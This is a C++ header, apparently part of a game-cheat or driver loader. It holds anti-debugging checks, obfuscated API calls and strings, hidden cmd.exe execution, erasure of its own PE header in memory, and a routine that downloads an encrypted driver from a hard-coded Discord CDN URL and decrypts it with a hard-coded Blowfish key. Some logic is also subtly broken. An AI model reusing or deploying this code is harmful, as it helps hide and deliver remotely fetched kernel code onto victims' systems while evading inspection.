#pragma once
#include <sstream>
#include "protect/lazy.h"
#include "protect/antiDbg.h"
#include <wininet.h>
#include "protect/blowfish/blowfish.h"
#include <fstream>
uintptr_t imagebase;
#pragma comment(lib, "wininet.lib")
struct encrypt_t
{
	std::string driver;
};

int bart()
{
	SPOOF_FUNC

	LI_FN(SetLastError).safe()(0);
	const auto last_error = LI_FN(GetLastError).safe()();

	return last_error != 0;
}

int abwe()
{
	SPOOF_FUNC

	unsigned long thread_hide_from_debugger = 0x11;

	const auto ntdll = LI_FN(LoadLibraryA).safe()(skCrypt("ntdll.dll"));

	if (ntdll == INVALID_HANDLE_VALUE || ntdll == NULL) { return false; }

	_NtQueryInformationProcess NtQueryInformationProcess = NULL;
	NtQueryInformationProcess = (_NtQueryInformationProcess)LI_FN(GetProcAddress).safe()(ntdll, skCrypt("NtQueryInformationProcess"));

	if (NtQueryInformationProcess == NULL) { return false; }

	(_NtSetInformationThread)(GetCurrentThread(), thread_hide_from_debugger, 0, 0, 0);

	return true;
}

int awer()
{
	SPOOF_FUNC

	int debugger_present = false;

	LI_FN(CheckRemoteDebuggerPresent).safe()(LI_FN(GetCurrentProcess).safe()(), &debugger_present);

	return debugger_present;
}

int were()
{
	SPOOF_FUNC

	int found = false;
	CONTEXT ctx = { 0 };
	void* h_thread = LI_FN(GetCurrentThread).safe()();

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (LI_FN(GetThreadContext).safe()(h_thread, &ctx))
	{
		if ((ctx.Dr0 != 0x00) || (ctx.Dr1 != 0x00) || (ctx.Dr2 != 0x00) || (ctx.Dr3 != 0x00) || (ctx.Dr6 != 0x00) || (ctx.Dr7 != 0x00))
		{
			found = true;
		}
	}

	return found;
}

void system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)
		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);
}

std::string readFileIntoString(const std::string& path) {
	SPOOF_FUNC

	auto ss = std::ostringstream{};
	std::ifstream input_file(path);
	if (!input_file.is_open()) {
		std::cerr << " Auth Error: Could not opened save key" << std::endl;
		exit(EXIT_FAILURE);
	}
	ss << input_file.rdbuf();
	return ss.str();
}

VOID ErasePEHeaderFromMemory()
{
	DWORD OldProtect = 0;

	// Get base address of module
	char* pBaseAddr = (char*)GetModuleHandle(NULL);

	// Change memory protection
	VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);

	// Erase the header
	SecureZeroMemory(pBaseAddr, 4096);
}

std::string StreamFileToMemString(std::string URL) {
	SPOOF_FUNC

	const char* header = TEXT("Accept: *" "/" "*\r\n\r\n");
	HANDLE hInterWebz = InternetOpenA(TEXT("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hURL = InternetOpenUrlA(hInterWebz, URL.c_str(), header, strlen(header), INTERNET_FLAG_DONT_CACHE, 0);

	char* Buffer = new char[100000000]; //100mb
	memset(Buffer, 0, 100000000);
	DWORD BytesRead = 1;

	std::string data;

	if (InternetReadFile(hURL, Buffer, 100000000, &BytesRead))
	{
		data = std::string(Buffer);
	}

	delete[] Buffer;
	InternetCloseHandle(hInterWebz);
	InternetCloseHandle(hURL);

	return data;
}

std::string GenerateHexString(int len) {
	SPOOF_FUNC

	srand(time(NULL));
	std::string str = TEXT("0123456789ABCDEF");
	std::string newstr;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

std::vector<BYTE> GetDriverSYS()

{
	SPOOF_FUNC

	encrypt_t encrypt;
	BLOWFISH blowfish(_xor_("1337909537910263"));
	std::string data = StreamFileToMemString(TEXT(R"(https://cdn.discordapp.com/attachments/947218122363007058/982236719539712020/1)"));
	encrypt.driver = blowfish.Decrypt_CBC(data);
	std::vector<uint8_t> Vector(encrypt.driver.begin(), encrypt.driver.end());
	return Vector;
}


void DeleteKey(std::ifstream& File)
{

	std::string regfile("key.txt");
	std::ofstream(regfile, std::ios::trunc); // clears the file
	File.setstate(std::ios::failbit); // sets the status to failed
	remove(regfile.c_str()); // deletes the file
}

uint32_t CalculateChecksum(const std::string& data) {
	
	SPOOF_FUNC

	uint32_t checksum = 0;
	for (char c : data) {
		checksum += static_cast<uint32_t>(c);
	}
	return checksum;
}

std::string tm_to_readable_time1(tm ctx) {
	SPOOF_FUNC

	std::time_t now = std::time(nullptr);
	std::time_t expiry = std::mktime(&ctx);

	double remainingSeconds = std::difftime(expiry, now);
	int remainingDays = static_cast<int>(remainingSeconds / (60 * 60 * 24));

	return std::to_string(remainingDays) + " day(s).";
}

static std::time_t string_to_timet(std::string timestamp) {
	SPOOF_FUNC

	auto cv = strtol(timestamp.c_str(), NULL, 10); // long

	return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
	SPOOF_FUNC

	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}